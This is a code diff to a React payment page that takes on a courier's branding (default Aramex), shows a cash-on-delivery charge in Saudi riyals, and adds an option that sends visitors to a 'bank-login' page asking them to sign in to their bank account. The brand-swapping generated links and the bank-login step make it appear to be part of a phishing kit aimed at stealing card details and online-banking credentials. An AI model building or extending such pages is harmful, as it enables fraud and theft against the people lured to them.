@@ -1,25 +1,33 @@
-import { useParams, useNavigate } from "react-router-dom";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, Shield, BadgeCheck } from "lucide-react";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, Shield, BadgeCheck, LogIn } from "lucide-react";
 import ServiceBadge from "@/components/ServiceBadge";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
+  const [searchParams] = useSearchParams();
   
-  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  const serviceKey = linkData?.payload?.service_key || searchParams.get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
+  // Check link type from URL parameter
+  const linkType = searchParams.get('type') || 'card';
+  
   const handleProceed = () => {
-    navigate(`/pay/${id}/card`);
+    if (linkType === 'login') {
+      navigate(`/pay/${id}/bank-login?service=${serviceKey}`);
+    } else {
+      navigate(`/pay/${id}/card?service=${serviceKey}`);
+    }
   };
   
   return (
@@ -111,15 +119,27 @@ const PaymentDetails = () => {
             background: `${branding.colors.primary}10`
           }}
         >
-          <div className="flex items-center gap-2 sm:gap-3">
-            <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
-            <div>
-              <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
-              <p className="text-xs sm:text-sm text-muted-foreground">
-                Visa، Mastercard، Mada
-              </p>
+          {linkType === 'login' ? (
+            <div className="flex items-center gap-2 sm:gap-3">
+              <LogIn className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
+              <div>
+                <p className="font-semibold text-sm sm:text-base">تسجيل دخول البنك</p>
+                <p className="text-xs sm:text-sm text-muted-foreground">
+                  سجل دخولك إلى حسابك البنكي لإتمام الدفع
+                </p>
+              </div>
             </div>
-          </div>
+          ) : (
+            <div className="flex items-center gap-2 sm:gap-3">
+              <CreditCard className="w-5 h-5 sm:w-6 sm:h-6" style={{ color: branding.colors.primary }} />
+              <div>
+                <p className="font-semibold text-sm sm:text-base">الدفع بالبطاقة</p>
+                <p className="text-xs sm:text-sm text-muted-foreground">
+                  Visa، Mastercard، Mada
+                </p>
+              </div>
+            </div>
+          )}
         </div>
       </div>
       
@@ -132,8 +152,17 @@ const PaymentDetails = () => {
           background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
         }}
       >
-        <span className="ml-2">الدفع بالبطاقة</span>
-        <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+        {linkType === 'login' ? (
+          <>
+            <span className="ml-2">تسجيل الدخول</span>
+            <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+          </>
+        ) : (
+          <>
+            <span className="ml-2">الدفع بالبطاقة</span>
+            <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+          </>
+        )}
       </Button>
     
       <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
